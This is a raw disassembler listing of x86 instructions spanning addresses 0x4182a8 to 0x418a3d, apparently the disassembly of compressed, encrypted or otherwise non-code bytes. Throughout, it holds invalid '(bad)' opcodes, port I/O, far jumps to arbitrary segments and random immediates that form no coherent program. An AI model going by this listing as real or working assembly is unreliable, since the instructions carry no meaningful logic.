  4182a8:	add    eax,0x75e746eb
  4182ad:	das    
  4182ae:	out    dx,al
  4182af:	lods   al,BYTE PTR ds:[esi]
  4182b0:	scas   al,BYTE PTR es:[edi]
  4182b1:	in     al,dx
  4182b2:	(bad)  
  4182b4:	or     ecx,DWORD PTR [ebp+0x2]
  4182b7:	test   al,0x18
  4182b9:	in     eax,dx
  4182ba:	and    DWORD PTR ds:0xbb115a57,edi
  4182c0:	jno    0x4182aa
  4182c2:	xchg   ebp,eax
  4182c3:	or     eax,0xdcb6e399
  4182c8:	xchg   dh,al
  4182ca:	push   ebp
  4182cb:	mov    al,ds:0x4e12bcbc
  4182d0:	jbe    0x418271
  4182d2:	stc    
  4182d3:	pop    edx
  4182d4:	jg     0x41834a
  4182d6:	enter  0xe7a6,0x30
  4182da:	mov    ah,BYTE PTR [edi+0x73]
  4182dd:	cmp    BYTE PTR [ecx],ch
  4182df:	xor    BYTE PTR [edx+ebp*4+0xf],ah
  4182e3:	in     eax,dx
  4182e4:	inc    edx
  4182e5:	mov    dh,0xb8
  4182e7:	dec    esi
  4182e8:	sub    BYTE PTR [esi-0x5c],al
  4182eb:	in     al,dx
  4182ec:	inc    edx
  4182ed:	gs ss or al,0xd0
  4182f1:	pusha  
  4182f2:	jle    0x4182c1
  4182f4:	(bad)  
  4182f5:	inc    ecx
  4182f6:	push   ss
  4182f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182f8:	cmp    ah,BYTE PTR [edx+ebp*2]
  4182fb:	jmp    0x418328
  4182fd:	ret    
  4182fe:	ins    BYTE PTR es:[edi],dx
  4182ff:	fsub   DWORD PTR [edx-0x6816ff79]
  418305:	sbb    ebx,edi
  418307:	cmp    DWORD PTR [ebx],ebp
  418309:	dec    eax
  41830a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41830b:	pop    ds
  41830c:	bound  esi,QWORD PTR [esi+0x2874e90e]
  418312:	sbb    DWORD PTR [eax-0x2787eb4],ebx
  418318:	mov    eax,ds:0xee3f562b
  41831d:	xchg   esp,eax
  41831e:	arpl   WORD PTR [eax+ebx*8-0x7f78061f],bx
  418325:	pop    esp
  418326:	test   DWORD PTR [edi-0x6d],ebx
  418329:	int3   
  41832a:	jmp    DWORD PTR [esi+0x17]
  41832d:	cmp    esi,DWORD PTR [edx+ebp*1-0x42]
  418331:	cmp    eax,0x19a1c5ed
  418336:	std    
  418337:	push   ebx
  418338:	pushf  
  418339:	scas   eax,DWORD PTR es:[edi]
  41833a:	jge    0x41833b
  41833c:	call   0x2742:0xbf65d00f
  418343:	adc    al,0xc6
  418345:	retf   0xfd31
  418348:	call   0x2672596e
  41834d:	inc    ebx
  41834e:	push   ebx
  41834f:	leave  
  418350:	test   al,0x63
  418352:	jae    0x418377
  418354:	push   0x1a
  418356:	mov    eax,ds:0x8f5a3269
  41835b:	scas   eax,DWORD PTR es:[edi]
  41835c:	add    DWORD PTR [edi+0x43],0x8b6da077
  418363:	adc    eax,0x44bf904c
  418368:	gs pop ebx
  41836a:	adc    ebx,ecx
  41836c:	(bad)  
  41836d:	push   esp
  41836e:	imul   edx,DWORD PTR [edx],0x34
  418371:	out    dx,eax
  418372:	xchg   ecx,eax
  418373:	and    DWORD PTR [edi+0x51],eax
  418376:	daa    
  418377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418378:	xchg   edi,eax
  418379:	scas   eax,DWORD PTR es:[edi]
  41837a:	fxsave [edi+0x60]
  41837e:	in     eax,0x2f
  418380:	cli    
  418381:	pop    esp
  418382:	jecxz  0x41831f
  418384:	push   edx
  418385:	xor    BYTE PTR [eax+0x7a],dh
  418388:	mov    bl,BYTE PTR gs:[eax-0x6a5342df]
  41838f:	aaa    
  418390:	(bad)
  418394:	call   0xc19d0e22
  418399:	bound  ecx,QWORD PTR [esi+0x4c]
  41839c:	and    dh,BYTE PTR [ebp-0x25e45dc6]
  4183a2:	sub    edx,0xffffff83
  4183a5:	mov    BYTE PTR [ecx-0x367de2e1],0xb1
  4183ac:	cmp    DWORD PTR [esi],edi
  4183ae:	lahf   
  4183af:	sbb    dl,dl
  4183b1:	pop    edx
  4183b2:	mov    esp,DWORD PTR [esp+esi*2]
  4183b5:	adc    BYTE PTR [edi-0x6ccaa931],0x7a
  4183bc:	fild   DWORD PTR [ebp+0x64]
  4183bf:	dec    edx
  4183c0:	call   0x848c9b2b
  4183c5:	ds rcr bh,1
  4183c8:	scas   eax,DWORD PTR es:[edi]
  4183c9:	jp     0x4183dd
  4183cb:	mov    ah,0xbc
  4183cd:	ret    
  4183ce:	mov    ds:0xba58effd,eax
  4183d3:	cmp    BYTE PTR [eax+0x30b35d58],al
  4183d9:	fcomi  st,st(1)
  4183db:	ror    BYTE PTR [esi+edi*1],cl
  4183de:	ficomp WORD PTR [ebx]
  4183e0:	jne    0x4183db
  4183e2:	mov    BYTE PTR [esi-0x56],bh
  4183e5:	pop    esp
  4183e6:	push   ss
  4183e7:	pop    ebp
  4183e8:	jl     0x41838a
  4183ea:	test   DWORD PTR [ebx],esp
  4183ec:	pop    ds
  4183ed:	aas    
  4183ee:	test   DWORD PTR [esi+0x21a6e541],ecx
  4183f4:	inc    eax
  4183f5:	lods   eax,DWORD PTR ds:[esi]
  4183f6:	pushf  
  4183f7:	test   DWORD PTR [eax],ebp
  4183f9:	mov    DWORD PTR [edi+0x27563797],ebp
  4183ff:	jge    0x4183e9
  418401:	rcl    DWORD PTR [eax-0x2eea54a],0x7c
  418408:	xor    dh,ah
  41840a:	loope  0x41845f
  41840c:	sub    DWORD PTR [eax],0xc36043fa
  418412:	ror    DWORD PTR [ebp-0x48a71f2],0x0
  418419:	xor    esp,DWORD PTR [eax]
  41841b:	jp     0x418432
  41841d:	and    dl,dh
  41841f:	pop    ebx
  418420:	mov    BYTE PTR [esp+ebx*4+0xc],al
  418424:	imul   BYTE PTR [ecx+eiz*8]
  418427:	inc    edi
  418428:	push   esi
  418429:	ret    
  41842a:	fstp   DWORD PTR [ecx-0x63]
  41842d:	xchg   ecx,eax
  41842e:	mov    ah,0x88
  418430:	push   ecx
  418431:	imul   esi,DWORD PTR [edi],0x62e17a68
  418437:	push   ecx
  418438:	mov    ebp,0x223e480a
  41843d:	test   eax,0xc671d2e8
  418442:	mov    ah,0xda
  418444:	or     eax,0xa1b25943
  418449:	pop    edi
  41844a:	loop   0x41843a
  41844c:	mov    ebp,0x1d075cb9
  418451:	add    al,0x28
  418453:	ins    DWORD PTR es:[edi],dx
  418454:	xchg   ebx,eax
  418455:	popf   
  418456:	cmp    edx,DWORD PTR [ebp-0x53ec1f6c]
  41845c:	retf   
  41845d:	imul   esi,DWORD PTR [eax+0x5303239e],0xffffffe2
  418464:	jle    0x41841b
  418466:	jbe    0x418494
  418468:	stc    
  418469:	cli    
  41846a:	inc    ecx
  41846b:	or     ch,BYTE PTR [edx+0x7a]
  41846e:	xchg   DWORD PTR [esp+ebx*2-0x2a],ecx
  418472:	sub    al,BYTE PTR [eax]
  418474:	add    al,0xe2
  418476:	inc    ecx
  418477:	outs   dx,BYTE PTR ds:[esi]
  418478:	mov    ecx,0x9cdd459c
  41847d:	nop
  41847e:	push   0x30
  418480:	mov    ?,WORD PTR [esi-0x374ddbae]
  418486:	ret    0xca61
  418489:	int    0xb1
  41848b:	into   
  41848c:	rcl    DWORD PTR [ecx],1
  41848e:	in     eax,dx
  41848f:	jp     0x4184c6
  418491:	dec    edx
  418492:	add    DWORD PTR [esi-0x1d],ebx
  418495:	push   ebx
  418496:	and    DWORD PTR [eax],ecx
  418498:	push   esp
  418499:	push   ebx
  41849a:	dec    esi
  41849b:	fdivr  QWORD PTR [ebp+0xa]
  41849e:	pop    ebx
  41849f:	js     0x418437
  4184a1:	add    dl,ah
  4184a3:	scas   eax,DWORD PTR es:[edi]
  4184a4:	push   ss
  4184a5:	aas    
  4184a6:	pop    ss
  4184a7:	pop    edi
  4184a8:	aam    0xe2
  4184aa:	lods   eax,DWORD PTR ds:[esi]
  4184ab:	pop    es
  4184ac:	jo     0x41849c
  4184ae:	pop    edx
  4184af:	add    eax,0x5edbdf85
  4184b4:	push   0x7
  4184b6:	imul   ebp,edi,0x29037871
  4184bc:	ffreep st(2)
  4184be:	pushf  
  4184bf:	bound  eax,QWORD PTR [ecx]
  4184c1:	mov    BYTE PTR [edi],0x12
  4184c4:	bound  eax,QWORD PTR [ebx-0x402ceaa4]
  4184ca:	mov    cl,0x93
  4184cc:	and    eax,0xa58cd8a4
  4184d1:	ror    bh,cl
  4184d3:	shr    BYTE PTR [esi],1
  4184d5:	imul   edi,DWORD PTR ds:0x8ba83775,0xc3ed61b9
  4184df:	mov    al,ds:0xa32ce589
  4184e4:	cmp    BYTE PTR [ebx-0x77],bh
  4184e7:	arpl   WORD PTR [ebp+ebx*8+0x5c],sp
  4184eb:	inc    ecx
  4184ec:	xchg   esi,eax
  4184ed:	mov    ch,0xd1
  4184ef:	add    ecx,DWORD PTR [edx+0x59]
  4184f2:	sub    dl,bl
  4184f4:	push   ebp
  4184f5:	xchg   ebp,eax
  4184f6:	jnp    0x4184d0
  4184f8:	sub    DWORD PTR [ebx+esi*8-0x42295445],ecx
  4184ff:	sub    edi,DWORD PTR [ecx-0x203436ca]
  418505:	dec    ebp
  418506:	or     DWORD PTR [ebx-0x2f],esi
  418509:	pop    edx
  41850a:	adc    ch,ah
  41850c:	jno    0x41851c
  41850e:	xchg   ebx,eax
  41850f:	push   ss
  418510:	pop    edi
  418511:	daa    
  418512:	jnp    0x41856c
  418514:	mov    cl,ah
  418516:	push   esp
  418517:	je     0x4184b0
  418519:	xor    dl,BYTE PTR ds:0xf16bda8b
  41851f:	xlat   BYTE PTR ds:[ebx]
  418520:	and    edx,DWORD PTR [esi]
  418522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418524:	test   DWORD PTR [edx-0x1b0bc81a],esi
  41852a:	sbb    dh,0x0
  41852d:	(bad)  
  41852e:	mov    eax,0xa0d17bed
  418533:	xchg   ecx,eax
  418534:	or     eax,0x2405632a
  418539:	xor    ebx,DWORD PTR [edx]
  41853b:	loopne 0x41855e
  41853d:	inc    ecx
  41853e:	fmul   DWORD PTR ds:0x1e4bbef4
  418544:	push   ss
  418545:	dec    esp
  418546:	or     eax,0xf7ef661d
  41854c:	cwde   
  41854d:	lods   al,BYTE PTR ds:[esi]
  41854e:	cmc    
  41854f:	out    0xf3,al
  418551:	xor    eax,0xfae1491f
  418556:	out    0x48,eax
  418558:	cdq    
  418559:	push   ecx
  41855a:	jno    0x4184ea
  41855c:	out    dx,al
  41855d:	inc    ecx
  41855e:	hlt    
  41855f:	(bad)  [esi-0xb57a5b2]
  418565:	push   ds
  418566:	cld    
  418567:	loopne 0x4185b4
  418569:	dec    edi
  41856a:	xchg   ebp,eax
  41856b:	iret   
  41856c:	xchg   edx,edx
  41856e:	loopne 0x4185b9
  418570:	dec    esp
  418571:	sbb    BYTE PTR [edi],al
  418573:	pop    esp
  418574:	test   al,0x32
  418576:	ins    BYTE PTR es:[edi],dx
  418577:	rcr    DWORD PTR [esi+0xb],0x34
  41857b:	addr16 mov ecx,0x2028efcc
  418581:	inc    eax
  418582:	fsubr  DWORD PTR [ebp-0x5d]
  418585:	ins    BYTE PTR es:[edi],dx
  418586:	xchg   ebx,eax
  418587:	ja     0x4185df
  418589:	jmp    0x4185ee
  41858b:	and    cl,BYTE PTR [edx+0x26]
  41858e:	std    
  41858f:	add    bl,dl
  418591:	adc    al,0x8b
  418593:	data16 jge 0x41859b
  418596:	add    al,0x85
  418598:	clc    
  418599:	adc    DWORD PTR [ecx],esi
  41859b:	push   0x3e
  41859d:	std    
  41859e:	dec    ebx
  41859f:	pop    esp
  4185a0:	ds mov bl,0x82
  4185a3:	test   al,0x89
  4185a5:	nop    DWORD PTR [ecx-0x80]
  4185a9:	xlat   BYTE PTR ds:[ebx]
  4185aa:	sbb    BYTE PTR [edx+0x326dcebb],dh
  4185b0:	loope  0x4185de
  4185b2:	ins    BYTE PTR es:[edi],dx
  4185b3:	cwde   
  4185b4:	pop    edx
  4185b5:	pop    ecx
  4185b6:	in     eax,0xd9
  4185b8:	mov    edi,0xf8c5aa55
  4185bd:	xor    al,0x94
  4185bf:	addr16 pop ds
  4185c1:	pop    esi
  4185c2:	cmp    ebp,DWORD PTR [edx+0xb]
  4185c5:	inc    eax
  4185c6:	add    eax,0x7d2eb92f
  4185cb:	(bad)  
  4185cc:	cdq    
  4185cd:	adc    DWORD PTR [ecx+0x86fcf4f],eax
  4185d3:	frstor [esi-0x3fe25888]
  4185d9:	mov    eax,0xa4127672
  4185de:	jo     0x41865e
  4185e0:	(bad)  
  4185e2:	and    ah,BYTE PTR [ebx+0x2]
  4185e5:	mov    ch,0x9e
  4185e7:	xchg   ebp,eax
  4185e8:	dec    eax
  4185e9:	out    0xd6,eax
  4185eb:	in     eax,dx
  4185ec:	dec    esi
  4185ed:	sub    DWORD PTR [ebp-0x7438cbe8],ebx
  4185f3:	dec    edx
  4185f4:	cli    
  4185f5:	xchg   DWORD PTR [esi],edx
  4185f7:	xchg   esi,eax
  4185f8:	ret    
  4185f9:	idiv   DWORD PTR [eax+esi*8-0x3c]
  4185fd:	add    DWORD PTR [edi*2+0x532e977c],edi
  418604:	push   0x4c
  418606:	mov    esi,0xc68325a
  41860b:	imul   esp,esi,0x57bfbb06
  418611:	(bad)  
  418613:	push   esp
  418614:	in     eax,0x9
  418616:	push   0x2e
  418618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418619:	xchg   esi,eax
  41861a:	pushf  
  41861b:	adc    ebp,ecx
  41861d:	sbb    eax,0x9657ced7
  418622:	jp     0x418673
  418624:	mov    dh,0x12
  418626:	pminsw mm2,QWORD PTR [ecx-0x60]
  41862a:	test   eax,0x1702775b
  41862f:	add    DWORD PTR ds:0x47168955,ebp
  418635:	adc    DWORD PTR [ebx-0x451b14b9],esp
  41863b:	sub    ah,BYTE PTR [ebp-0x46]
  41863e:	std    
  41863f:	or     eax,0x1f2bb6f7
  418644:	cmp    BYTE PTR [edi],0x22
  418647:	iret   
  418648:	adc    DWORD PTR [esi],ebp
  41864a:	repnz xor al,0x46
  41864d:	vpmaddwd ymm4,ymm2,ymm5
  418651:	dec    esi
  418652:	xchg   edx,eax
  418653:	in     al,0xb1
  418655:	push   0xd
  418657:	adc    al,0xba
  418659:	sub    eax,0x3bf019a5
  41865e:	test   BYTE PTR [edx],al
  418660:	stos   BYTE PTR es:[edi],al
  418661:	out    dx,al
  418662:	test   BYTE PTR [edx],bh
  418664:	daa    
  418665:	cdq    
  418666:	sub    eax,0x61b03b71
  41866b:	in     al,0xa1
  41866d:	in     al,dx
  41866e:	or     ebp,DWORD PTR [ecx]
  418670:	jg     0x4185f2
  418672:	shl    ecx,0xa5
  418675:	and    bl,ch
  418677:	inc    esp
  418678:	dec    ebp
  418679:	aad    0xa3
  41867b:	ins    DWORD PTR es:[edi],dx
  41867c:	push   0x34
  41867e:	icebp  
  41867f:	push   eax
  418680:	mov    al,ds:0xdbc52457
  418685:	inc    eax
  418686:	loop   0x4186d9
  418688:	and    BYTE PTR [edx+0x2ea5a3e8],bl
  41868e:	call   0xc158e906
  418693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418694:	sbb    esp,esp
  418696:	mov    ecx,DWORD PTR [edi]
  418698:	pusha  
  418699:	pop    ss
  41869a:	jbe    0x418681
  41869c:	ss or  dl,cl
  41869f:	xor    DWORD PTR [eax],0x1e0abba5
  4186a5:	add    al,ah
  4186a7:	xchg   esi,eax
  4186a8:	dec    esp
  4186a9:	in     eax,dx
  4186aa:	setae  BYTE PTR [ebx+0x332d8fe8]
  4186b1:	in     al,dx
  4186b2:	cmp    al,0xe2
  4186b4:	outs   dx,BYTE PTR ds:[esi]
  4186b5:	adc    al,0x9a
  4186b7:	fs dec eax
  4186b9:	in     eax,0xdf
  4186bb:	std    
  4186bc:	xchg   esp,eax
  4186bd:	pusha  
  4186be:	pop    es
  4186bf:	dec    ecx
  4186c0:	and    ebx,DWORD PTR [esi+0x3c]
  4186c3:	xchg   ebx,eax
  4186c4:	xchg   esp,eax
  4186c5:	add    edi,DWORD PTR [edx]
  4186c7:	sub    al,0x69
  4186c9:	dec    ebx
  4186ca:	mov    dl,0x71
  4186cc:	jno    0x4186c1
  4186ce:	in     eax,0x2
  4186d0:	shl    BYTE PTR ds:[ebp+0x67344e20],1
  4186d7:	fisttp QWORD PTR [edi+edi*2+0x7b]
  4186db:	test   al,0x27
  4186dd:	iret   
  4186de:	ins    BYTE PTR es:[edi],dx
  4186df:	adc    al,0x6b
  4186e1:	inc    ebp
  4186e2:	sbb    eax,0xdd1f843b
  4186e7:	and    esp,DWORD PTR [ecx-0x38]
  4186ea:	mov    eax,cs
  4186ec:	xor    BYTE PTR [esi+0x51],0xf4
  4186f0:	add    BYTE PTR [ebx],bl
  4186f2:	xchg   ebx,eax
  4186f3:	test   DWORD PTR [edi-0x3b],eax
  4186f6:	fisttp WORD PTR ds:0xb3a22295
  4186fc:	nop
  4186fd:	add    ebp,ebx
  4186ff:	push   DWORD PTR [ebp+0x75]
  418702:	mov    ds:0x702287a5,eax
  418707:	test   DWORD PTR [esi],edx
  418709:	cmp    DWORD PTR [ecx+0x369e0375],ecx
  41870f:	ror    BYTE PTR [ecx+0x457b4e42],0xaa
  418716:	retf   0xb9cf
  418719:	mov    ah,0x42
  41871b:	push   esi
  41871c:	hlt    
  41871d:	ins    BYTE PTR es:[edi],dx
  41871e:	out    dx,al
  41871f:	arpl   WORD PTR [ebp+0x5],di
  418722:	lahf   
  418723:	stos   DWORD PTR es:[edi],eax
  418724:	mov    bl,0xc7
  418726:	push   ebx
  418727:	pop    ebp
  418728:	mov    al,ds:0x762bd1c2
  41872d:	stos   BYTE PTR es:[edi],al
  41872e:	addr16 cwde 
  418730:	test   eax,0xf54b0b71
  418735:	mov    bl,0x11
  418737:	sar    BYTE PTR [ebx],cl
  418739:	in     eax,0x4d
  41873b:	push   ebx
  41873c:	adc    al,0xf7
  41873e:	frstor [edi+0x2eae82a8]
  418744:	sar    bl,0x56
  418747:	push   ebx
  418748:	push   ebx
  418749:	sar    DWORD PTR [edi],cl
  41874b:	mov    al,0xce
  41874d:	lods   al,BYTE PTR ds:[esi]
  41874e:	inc    eax
  41874f:	cdq    
  418750:	loop   0x4187ce
  418752:	pushf  
  418753:	sbb    eax,0x88d286d3
  418758:	xchg   edi,eax
  418759:	inc    edi
  41875a:	je     0x41870a
  41875c:	addr16 jmp 0x756c:0x6152d02e
  418764:	data16 jl 0x4186fd
  418767:	dec    esi
  418768:	pop    ds
  418769:	add    ch,BYTE PTR [edi]
  41876b:	pop    ds
  41876c:	addr16 push edx
  41876e:	xor    ebp,DWORD PTR [edi+0x626b3ceb]
  418774:	loope  0x418713
  418776:	xor    eax,0x5ccd24c7
  41877b:	dec    ebp
  41877c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41877d:	push   edi
  41877e:	cmp    DWORD PTR [esi],0x420c3243
  418784:	outs   dx,DWORD PTR ds:[esi]
  418785:	xchg   edx,eax
  418786:	mov    edi,esi
  418788:	dec    BYTE PTR [edx+0x7a]
  41878b:	cmp    esp,ebx
  41878d:	jmp    0xd2b8:0xabab3e35
  418794:	jb     0x41878c
  418796:	xchg   ebp,eax
  418797:	jnp    0x41872c
  418799:	adc    BYTE PTR [ecx-0x141381fd],al
  41879f:	cmp    ch,bl
  4187a1:	ret    0x3ba7
  4187a4:	jnp    0x418747
  4187a6:	bound  ebx,QWORD PTR [ebp+0x27]
  4187a9:	adc    BYTE PTR [eax-0xb],bh
  4187ac:	stos   DWORD PTR es:[edi],eax
  4187ad:	dec    ebx
  4187ae:	xchg   ebp,eax
  4187af:	(bad)
  4187b2:	cmp    al,0x63
  4187b4:	int3   
  4187b5:	or     al,0x13
  4187b7:	mov    edx,0xe5b4b78
  4187bc:	mov    al,0x7a
  4187be:	cmc    
  4187bf:	jle    0x41876c
  4187c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187c2:	fnstcw WORD PTR [edx+0x2c5deae0]
  4187c8:	jecxz  0x4187ac
  4187ca:	jbe    0x41882d
  4187cc:	mov    ebx,0xe2211d08
  4187d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187d2:	jg     0x4187dd
  4187d4:	stos   BYTE PTR es:[edi],al
  4187d5:	ficom  DWORD PTR [eax+0xd]
  4187d8:	sub    al,0x23
  4187da:	cmp    DWORD PTR [eax],ecx
  4187dc:	adc    bl,0xb2
  4187df:	sbb    BYTE PTR [ecx-0x4c],ah
  4187e2:	(bad)  
  4187e3:	adc    eax,0x613749de
  4187e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187e9:	stos   DWORD PTR es:[edi],eax
  4187ea:	xor    al,0x3c
  4187ec:	mov    ebx,DWORD PTR [ecx+0x3c]
  4187ef:	mov    dh,0x87
  4187f1:	scas   al,BYTE PTR es:[edi]
  4187f2:	rcl    al,cl
  4187f4:	or     BYTE PTR [eax-0x13],cl
  4187f7:	rol    DWORD PTR [edi+0x5c0a7540],0x17
  4187fe:	outs   dx,BYTE PTR ds:[esi]
  4187ff:	loope  0x4187d9
  418801:	add    DWORD PTR [bx-0x42fc],esp
  418806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418807:	sbb    eax,0x23a0106a
  41880c:	rol    BYTE PTR [edx+0x7d],0xdb
  418810:	hlt    
  418811:	cdq    
  418812:	mov    ds:0x2feb55b7,al
  418817:	aad    0xff
  418819:	fiadd  DWORD PTR [eax-0x79cf7b91]
  41881f:	shl    DWORD PTR [eax],0x1b
  418822:	jns    0x4187c5
  418824:	jmp    0x2d95b23e
  418829:	mov    bh,0xa1
  41882b:	xor    BYTE PTR [edi+0x5e],bh
  41882e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41882f:	stos   BYTE PTR es:[edi],al
  418830:	stc    
  418831:	jp     0x41888c
  418833:	fmul   QWORD PTR [ebx-0x4c]
  418836:	sub    BYTE PTR ds:0xa97b7cbe,cl
  41883c:	mov    al,0xff
  41883e:	popf   
  41883f:	sbb    al,0x79
  418841:	adc    DWORD PTR ds:0x71a99b62,0xcc4c8ef8
  41884b:	les    ecx,FWORD PTR [ebp+0x3b]
  41884e:	pop    edx
  41884f:	inc    edi
  418850:	and    eax,0x5b2aadd5
  418855:	sub    bh,BYTE PTR [ecx+0xc52496d]
  41885b:	test   al,0x62
  41885d:	cwde   
  41885e:	push   edi
  41885f:	push   0x35
  418861:	mov    ds:0xe0bffde8,eax
  418866:	add    eax,edi
  418868:	adc    DWORD PTR [edx+esi*1],esi
  41886b:	dec    esp
  41886c:	enter  0x43d2,0xe1
  418870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418871:	lea    ecx,[ecx-0x66f63115]
  418877:	pop    ecx
  418878:	test   eax,0xa7d8567a
  41887d:	mov    ecx,0x38106bef
  418882:	shl    DWORD PTR [ecx+0x15],cl
  418885:	inc    ecx
  418886:	fiadd  WORD PTR [eax-0x2959b920]
  41888c:	push   ecx
  41888d:	add    ecx,ebx
  41888f:	pop    esi
  418890:	dec    esi
  418891:	xor    BYTE PTR ds:0xb440e344,0x71
  418898:	scas   al,BYTE PTR es:[edi]
  418899:	mov    WORD PTR [ebp-0x411f5c23],es
  41889f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188a0:	or     dh,BYTE PTR [ebx-0xa]
  4188a3:	add    ch,BYTE PTR [edx-0x53]
  4188a6:	lods   al,BYTE PTR ds:[esi]
  4188a7:	fs lock adc ecx,edi
  4188ab:	mov    gs,WORD PTR ds:0xb4fc582b
  4188b1:	ja     0x41892d
  4188b3:	cmp    bl,BYTE PTR [eax+0x2c3e8847]
  4188b9:	arpl   WORD PTR [edx],di
  4188bb:	imul   eax,DWORD PTR [ecx+0x52],0xffffffd4
  4188bf:	call   0xd170b436
  4188c4:	add    dl,cl
  4188c6:	mov    cl,0x8e
  4188c8:	call   0x5f9a0216
  4188cd:	push   ebp
  4188ce:	arpl   WORD PTR ds:0xca6f989a,ax
  4188d4:	sbb    al,0xa
  4188d6:	fild   QWORD PTR [esi+0x61345902]
  4188dc:	repz in al,dx
  4188de:	sub    eax,0xff862ce5
  4188e3:	or     al,0x99
  4188e5:	mov    ebp,0xc945c2ff
  4188ea:	jo     0x41892c
  4188ec:	xor    eax,0x621688ff
  4188f1:	push   edi
  4188f2:	aad    0xfd
  4188f4:	(bad)  
  4188f5:	cmp    esi,esp
  4188f7:	mov    dh,0x6c
  4188f9:	cmp    esi,DWORD PTR [edx]
  4188fb:	jp     0x4188a0
  4188fd:	aaa    
  4188fe:	sar    dh,1
  418900:	add    DWORD PTR [ecx],esi
  418902:	stos   BYTE PTR es:[edi],al
  418903:	inc    eax
  418904:	jmp    0x9db0e019
  418909:	sub    bh,bl
  41890b:	retf   
  41890c:	in     eax,0x19
  41890e:	push   0xa89c38e4
  418913:	(bad)  
  418915:	push   edx
  418916:	cmp    BYTE PTR [edx+0x76a4f4ff],0x25
  41891d:	pop    esp
  41891e:	stos   DWORD PTR es:[edi],eax
  41891f:	in     al,0x51
  418921:	psubusb mm5,QWORD PTR [ebx-0x728dc54d]
  418928:	cmp    eax,0x67a26a55
  41892d:	push   ss
  41892e:	fucomp st(4)
  418930:	mov    dl,al
  418932:	outs   dx,DWORD PTR ds:[esi]
  418933:	fld    TBYTE PTR [ecx-0x2ed4ffab]
  418939:	stc    
  41893a:	shr    BYTE PTR [ebp+0x39],cl
  41893d:	mov    dl,0xb3
  41893f:	push   0x42a9043d
  418944:	push   ds
  418945:	push   ebx
  418946:	aaa    
  418947:	push   ss
  418948:	and    ebx,DWORD PTR [esi-0x5acdb2b9]
  41894e:	push   esp
  41894f:	aam    0xcc
  418951:	arpl   WORD PTR es:[edi+0x762c1185],bx
  418958:	mov    eax,0xc71b33
  41895d:	dec    esp
  41895e:	arpl   WORD PTR [eax+0x38],sp
  418961:	fmul   DWORD PTR [ebx-0x22]
  418964:	icebp  
  418965:	loop   0x418950
  418967:	aad    0x85
  418969:	mov    dh,0x84
  41896b:	mov    ?,WORD PTR ss:[ebp-0x6d0c6d31]
  418972:	adc    ah,BYTE PTR [edx-0x56]
  418975:	pop    ss
  418976:	lods   eax,DWORD PTR ds:[esi]
  418977:	aam    0x46
  418979:	jb     0x418928
  41897b:	pusha  
  41897c:	push   esp
  41897d:	cmp    eax,0x19749bb2
  418982:	cld    
  418983:	scas   eax,DWORD PTR es:[edi]
  418984:	push   esp
  418985:	retf   
  418986:	mov    edx,0xa2849f4e
  41898b:	push   es
  41898c:	sub    esp,DWORD PTR [edx+0x50e77e80]
  418992:	aam    0x3e
  418994:	jecxz  0x418a02
  418996:	mov    ebx,0xcb64933d
  41899b:	add    cl,cl
  41899d:	into   
  41899e:	push   edi
  41899f:	dec    ebx
  4189a0:	pushf  
  4189a1:	shr    DWORD PTR [ecx+0x5c],cl
  4189a4:	mov    cl,0x96
  4189a6:	ss inc eax
  4189a8:	enter  0x9a78,0x58
  4189ac:	or     ebx,DWORD PTR [edx+0xe]
  4189af:	fnstcw WORD PTR [edi]
  4189b1:	cmp    ebp,DWORD PTR [edi]
  4189b3:	in     al,0xc
  4189b5:	adc    esp,DWORD PTR [esi]
  4189b7:	inc    ecx
  4189b8:	xor    esp,DWORD PTR [ecx-0xf72de1c]
  4189be:	dec    ebx
  4189bf:	or     bh,BYTE PTR [edx+0x45]
  4189c2:	pop    es
  4189c3:	iret   
  4189c4:	leave  
  4189c5:	xchg   edx,eax
  4189c6:	arpl   WORD PTR [ecx+0x262751c0],di
  4189cc:	cmp    al,0x2f
  4189ce:	jae    0x4189d6
  4189d0:	lahf   
  4189d1:	push   edi
  4189d2:	add    BYTE PTR [esi],dl
  4189d4:	mov    bl,0x5
  4189d6:	cmp    BYTE PTR [edi],bl
  4189d8:	fdiv   DWORD PTR [ebp+0x10]
  4189db:	dec    ebx
  4189dc:	xchg   ebx,eax
  4189dd:	jge    0x4189a0
  4189df:	dec    ecx
  4189e0:	lods   eax,DWORD PTR ds:[esi]
  4189e1:	test   al,0x2c
  4189e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189e4:	sub    BYTE PTR [edx+0x2ac31049],al
  4189ea:	xor    eax,0xb4beaaa1
  4189ef:	pop    ds
  4189f0:	jecxz  0x418a5c
  4189f2:	outs   dx,BYTE PTR ds:[esi]
  4189f3:	test   al,0xef
  4189f5:	and    al,0x3e
  4189f7:	adc    ebx,0x13
  4189fa:	and    BYTE PTR [edi+0x6f1c9be0],dh
  418a00:	call   0xe5e3:0x1a74b4ed
  418a07:	out    0x90,al
  418a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a0a:	pop    esi
  418a0b:	mov    ah,dh
  418a0d:	add    ah,bl
  418a0f:	repz mov ecx,0x78058704
  418a15:	push   eax
  418a16:	imul   edx,DWORD PTR [edx],0xc53e51e1
  418a1c:	test   DWORD PTR [eax+0x546c2b23],ebp
  418a22:	or     dh,0x3d
  418a25:	xlat   BYTE PTR ds:[ebx]
  418a26:	jge    0x4189e8
  418a28:	mov    edx,0x16fc7981
  418a2d:	or     al,0x65
  418a2f:	push   cs
  418a30:	xchg   esp,eax
  418a31:	mov    cl,0x4d
  418a33:	sub    edi,DWORD PTR [ebx-0x27]
  418a36:	and    ebx,DWORD PTR [edi+ebx*4-0x3bce868a]
  418a3d:	mov    DWORD PTR [ebx-0x8],0x2e64453a
